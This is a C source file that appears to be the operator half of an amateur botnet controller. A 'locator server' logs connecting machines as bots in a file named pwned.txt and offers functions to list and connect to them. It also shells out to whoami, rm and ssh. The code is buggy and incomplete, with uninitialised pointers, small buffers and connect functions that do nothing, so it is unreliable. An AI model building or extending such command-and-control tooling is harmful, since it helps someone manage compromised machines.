#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <pthread.h>
#include "flags.c"

int get_file_size(const char* file_name, int print_){       //Get the size of a file (optionally print size).
    struct stat fsize;          //Initialize struct stat.
    int f_size;                 //Variable for size of the file to be return.

    if((f_size = stat(file_name, &fsize))==0){
        return f_size;
    }
    if(print_){         //Optional print size.(ONLY used for debugging).
        printf("\n>File size: %d", f_size);
    }

    return f_size;
}

const char* get_current_time(char* buffer){         //Format local time into string.
    struct tm* time_info;
    time_t time_handle;
    char time_buffer[30], date_buffer[30];

    time(&time_handle);         //Get raw time.
    time_info = localtime(&time_handle);

    strftime(time_buffer, sizeof(time_buffer), "[%T -", time_info);     //Get current time of day in 24/hour format.
    strftime(date_buffer, sizeof(date_buffer), " %m/%d/%y]", time_info);        //Get current data in "Month/Day/Year" format.
    
    if(sprintf(buffer, "%s%s", time_buffer, date_buffer)<0){        //Format both time buffers into a single buffer to print both date and time.
        printf("\n!>Failed to format local time.\n");
    }
    
    return buffer;
}

void bot_conn_default(char* name_){         //Connect to machine via given name.
    FILE* read_bfile;       //Pointer to bot file.
    const char* bfilename = "pwned.txt";        //Const char for filename.
    char read_line[MAX_LINE_BUF_];          //File line buffer.
    
    if(strlen(name_)<=1){       //Check string length.
        printf("!>Invalid name.[%s]\n", name_);
        return;
    }

    if((read_bfile = fopen(bfilename, "r"))==NULL){         //Open file for reading.
            printf("!>Failed to open file.\n");
        return;
    }

    while(fgets(read_line, sizeof(read_line), read_bfile)!=NULL){       //Read until name is found.
        if(strstr(read_line, name_)){       //Check for name.
            printf(">[debug] Found, Connecting...\n");
            break;
        }
    }
    printf(">End of file.\n");

    return;
}

void bot_conn_custom_port(char* name_, int port){       //Connect to given machine via name and selected port.
    FILE* read_bfile;       //Pointer to bot file.
    const char* bfilename = "pwned.txt";        //Const char for filename.
    char read_line[MAX_LINE_BUF_];          //File line buffer.
    
    printf("\n>Selected [%s:%d]\n", name_, port);
    if((read_bfile = fopen(bfilename, "r"))==NULL){         //Open file for reading.
        printf("\n!>Failed to open file.\n");
        return;
    }

    while(fgets(read_line, sizeof(read_line), read_bfile)!=NULL){       //Read pwned.txt.
        printf(">%s\n", read_line);
    }
    printf(">End of file.\n");
    
    return;
}

void read_file(void){       //Read bot file.
    FILE* bots_file, *name_file;
    const char* file_name = "pwned.txt";
    const char* name_filename = "name.txt";
    char* username;
    
    char name_[15];
    if(sprintf(name_, "whoami > %s", name_filename)<0){
        return;
    }
    if((name_file = fopen(name_filename, "r"))==NULL){
        if((name_file = fopen(name_filename, "w"))==NULL){
            return;
        }
        fclose(name_file);
        system(name_);
    }
    if((name_file = fopen(name_filename, "r"))==NULL){
        return;
    }
    char user_line[20];
    while((fgets(user_line, sizeof(user_line), name_file))!=NULL){
        username = user_line;
    }
    if(fclose(name_file)==0){
        if(remove(name_filename)!=0){
            system("rm name.txt");
        }
    }
    
    if((bots_file = fopen(file_name, "r"))==NULL){          //Open and read from botnet file.
        printf("\n>First time use detected. Creating %s.\n", file_name);
        if((bots_file = fopen(file_name, "w"))==NULL){      //Create botnet file if it does not exist.
            printf("\n!>Failed to create file.\n");
            exit(0);
        }
        printf("\n>Created %s.\n", file_name);
        return;
    }

    if(get_file_size(file_name, 0)>=1){         //Read file.
        puts("\n>Bots:\n");
        char read_line[MAX_LINE_BUF_];
        while(fgets(read_line, MAX_LINE_BUF_, bots_file)){
            usleep(1000);
            printf("\n>\t%s\n", read_line);
        }
    }else{
        puts("\n!>You have no bots.\n");
    }
    
    return;
}

int timer_val = TIMER_COUNT_;
void locater_timer(int sfd){        //Locate for given amount of seconds.
    printf("\n?>The locator server will remain active until %d seconds of absence has occurred.\n", timer_val);
    while(timer_val!=0){
        sleep(1);
        timer_val-=1;
    } 
    close(sfd);
    return;
}

int server_ops(int sfd){        //Setup locator server.
    FILE* bot_file;
    const char* bfile_name = "pwned.txt";
    int online_, client_conn;
    pid_t f_process;

	int confirm = 1;
	if(setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &confirm, sizeof(confirm))<0){		//Set socket options.
		printf("1>Failed to set socket options.\n");
		return 1;
	}

    if(timer_val==0){       //Hacky fix to double print bug.
        return 1;
    }

    f_process = fork();     //Fork process into timer and server.
    if(f_process!=0){       //Launch timer in parent process.
        locater_timer(sfd);
        puts("\n>Activity absence, shutting down server.");
        return 0;
    }
    if(f_process==0){       //Launch server in child process.
        online_ = listen(sfd, CLIENT_MAX_);
        if(online_!=0){
            printf("\n!>Failed to launch server.\n");
            return 1;
        }
        if(online_==0){     //Listen for connections.
            while(1){
                char addr[30], port[30];
                static int index_counter = 0;
                struct sockaddr_in client_details, *clientp;
                socklen_t client_size = sizeof(client_details);

                puts("\n>Server activ.");

                client_conn = accept(sfd, (struct sockaddr*)&client_details, &client_size);     //Accept client before processing.
                if(client_conn<0){
                    printf("\n!>Client connection error.\n");
                    continue;
                }
                timer_val = TIMER_COUNT_;
                if(ntohs(clientp->sin_port)!=atoi(SERV_PORT_)){     //Check port for validation.
                    char* addr_string = inet_ntoa(clientp->sin_addr);
                    int port_ = ntohs(clientp->sin_port);
                    printf("\n>Unauthorized connection refused.[%s:%d]\n", addr_string, port_);
                    close(client_conn);         //Refuse unauthorized connection.
                }

                getnameinfo((struct sockaddr*)&client_details, client_size, addr, sizeof(addr), port, sizeof(port), NI_NUMERICHOST);

                char time_added[10], info_log[115];
                get_current_time(time_added);

                if((bot_file = fopen(bfile_name, "w"))==NULL){      //Open botfile for writing.
                    printf("\n!>Failed to open list file.\n");
                    return 1;
                }
                ++index_counter;
                if(sprintf(info_log, ">Info[%s:%s]\n\t>Recieved[%s]\n\t\t>Index[%d]", addr, port, time_added, index_counter)<0){        //Log time of connection and client data.
                    printf("\n!>Failed to format info.\n");
                    return 1;
                }
                if(fprintf(bot_file, "%s", info_log)<0){
                    printf("\n!>Failed to write to file.\n");
                    return 1;
                }
                printf("\n>Successfully logged [%s:%s].\n", addr, port);
                close(client_conn);

                if(index_counter==CLIENT_MAX_){         //Stop adding clients upon reaching maximum index.
                    close(client_conn);
                    close(sfd);
                    puts("\n!>Reached maximum bot count.\n?>To gain more bots, edit the \'operations.c\' CLIENT_MAX_ macro to enable a larger bot count.\n");
                    return 0;
                }
            }
        }
    }
    
    close(sfd);
    if(timer_val==TIMER_COUNT_){
    printf("\n!>Failed to launch server.\n");
    return 0;
    }
}

void test_connections(void){        //Pre-reqs to locator server.
    puts("\n>Setting up locator server...");

    struct sockaddr_in serv;
    serv.sin_addr.s_addr = inet_addr(SERV_ADDR_);
    serv.sin_family = AF_INET;
    serv.sin_port = htonl(atoi(SERV_PORT_));
    
    struct addrinfo info, *infop;
    bzero(&info, sizeof(info));
    info.ai_family = serv.sin_family;
    info.ai_socktype = SOCK_STREAM;
    info.ai_protocol = IPPROTO_TCP; 

    if(getaddrinfo(SERV_ADDR_, SERV_PORT_, &info, &infop)<0){
        printf("\n!>Failed to use getaddrinfo().\n");
        return;
    }

    int serv_socket = socket(infop->ai_family, infop->ai_socktype, infop->ai_protocol);
    if(serv_socket<0){
        printf("\n!>Failed to generate server socket.\n");
        return;
    }

    if(bind(serv_socket, (struct sockaddr*)infop->ai_addr, infop->ai_addrlen)<0){
        printf("\n!>Failed to bind socket.\n");
        char fix_error[40];
        sprintf(fix_error, "ssh localhost -p %s > /dev/null 2>&1", SERV_PORT_);
        system(fix_error);
        puts("____________________\n>Retrying...");
        timer_val = TIMER_COUNT_;
        test_connections();
    }
    freeaddrinfo(infop); 

    if(server_ops(serv_socket)!=0){ 
        if(close(serv_socket)<0){
            printf("\n!>Failed to close socket.\n");
        }
    }

    return;
}
